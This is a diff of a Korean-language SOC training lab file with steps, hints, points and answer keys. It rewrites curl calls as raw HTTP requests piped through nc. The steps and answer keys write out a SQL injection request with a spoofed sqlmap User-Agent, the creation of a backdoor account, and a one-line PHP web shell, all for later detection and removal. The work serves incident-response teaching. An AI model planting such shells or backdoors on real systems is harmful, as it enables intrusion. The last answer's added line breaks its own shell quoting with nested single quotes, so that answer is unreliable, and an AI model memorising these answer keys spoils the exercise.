@@ -95,7 +95,7 @@ steps:
 
       ```bash
       # ── 외부 공격자 VM 192.168.0.202 에서: 침투 — sqlmap UA SQLi 주입 ──
-      curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=socw9%27%20UNION%20SELECT%201--%20-"
+      echo -en 'GET /?id=socw9%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null
       # ── el34-web 에서: 지속성 발판 — 백도어 계정 socw9bd + 웹쉘 작성 ──
       userdel -r socw9bd 2>/dev/null; useradd -m -s /bin/bash socw9bd; echo "<?php system(\$_GET[c]); ?>" > /tmp/socw9_shell.php; echo planted
       # 로그 수렴 대기 후 완료 마커
@@ -106,14 +106,14 @@ steps:
       `done` 출력 시 통과. **근거:** SQLi 요청 + 백도어 계정(socw9bd) + 웹쉘 파일이 모두 실행되고
       incident done 이 나오면 사고 재현 성공 — 이 두 발판이 이후 식별·제거의 표적이다.
       ## 🔧 도구 풀이
-      - `-A sqlmap/1.7` — curl UA 를 SQL 자동 공격 도구로 위장. `useradd -m -s /bin/bash socw9bd` — 백도어 계정(명단에 없는 출입증).
+      - nc `User-Agent: sqlmap/1.7` — SQL 자동 공격 도구 UA 시그니처. `useradd -m -s /bin/bash socw9bd` — 백도어 계정(명단에 없는 출입증).
       - 웹쉘 `<?php system($_GET[c]); ?>` — 파라미터 c 의 명령을 실행하는 한 줄(침투 경로가 패치돼도 남는 발판).
     hint: 'SQLi + 백도어 계정 + 웹쉘 파일'
     category: recon
     points: 10
     answer: |
       # 1) 침투 — sqlmap UA로 SQLi 주입(웹/네트워크 로그에 공격 흔적)
-      ssh att@192.168.0.202 "curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=socw9%27%20UNION%20SELECT%201--%20-\""
+      ssh att@192.168.0.202 "echo -en 'GET /?id=socw9%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null"
       # 2) 지속성 발판 — 백도어 계정 socw9bd 생성 + 웹쉘 /tmp/socw9_shell.php 작성
       docker exec el34-web sh -c 'userdel -r socw9bd 2>/dev/null; useradd -m -s /bin/bash socw9bd; echo "<?php system(\$_GET[c]); ?>" > /tmp/socw9_shell.php; echo planted'
       # 3) 로그 수렴 대기 후 완료 마커
@@ -211,7 +211,7 @@ steps:
       sudo suricatasc -c reload-rules
 
       # ── 외부 공격자 VM 192.168.0.202 에서: 출발지가 다시 움직이게 유발(테스트 트래픽) ──
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/
+      echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null
 
       # ── el34-ips 에서: 격리 룰 포착 횟수(1+) + self-clean(룰 삭제 + reload) (4초 후) ──
       sudo grep -c 9509001 /var/log/suricata/eve.json
@@ -235,7 +235,7 @@ steps:
       docker exec el34-ips sh -c 'sudo suricatasc -c reload-rules'
       # 3) 출발지가 다시 움직이게 유발(테스트 트래픽)
       sleep 2
-      ssh att@192.168.0.202 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/'
+      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null"
       # 4) 격리 룰이 eve.json에 포착된 횟수(1+ = 출발지 트래픽 플래그됨)
       sleep 4
       docker exec el34-ips sh -c 'sudo grep -c 9509001 /var/log/suricata/eve.json'
@@ -322,7 +322,7 @@ steps:
 
       ```bash
       # 1) Recover — 웹 헬스체크(HTTP 상태코드만) — 서비스 정상성
-      curl -s -o /dev/null -w "web=%{http_code}\n" -H "Host: dvwa.el34.lab" http://localhost/
+      echo "web=$(echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 localhost 80 | head -1 | grep -oE '[0-9]{3}')"
       # 2) 발판 잔재 — 계정이 남아있으면 잔재!, 없으면 clean
       id socw9bd 2>/dev/null && echo "계정 잔재!" || echo "clean"
       # 3) 해석 — 서비스 정상 + 발판 0 = 복구 완료
@@ -339,7 +339,7 @@ steps:
     points: 12
     answer: |
       # 1) Recover — 웹 헬스체크(HTTP 상태코드만) — 서비스 정상성
-      docker exec el34-web sh -c 'curl -s -o /dev/null -w "web=%{http_code}\n" -H "Host: dvwa.el34.lab" http://localhost/'
+      docker exec el34-web sh -c 'echo "web=$(echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 localhost 80 | head -1 | grep -oE '[0-9]{3}')"'
       # 2) 발판 잔재 — 계정이 남아있으면 잔재!, 없으면 clean
       docker exec el34-web sh -c 'id socw9bd 2>/dev/null && echo "계정 잔재!" || echo "clean"'
       # 3) 해석 — 서비스 정상 + 발판 0 = 복구 완료
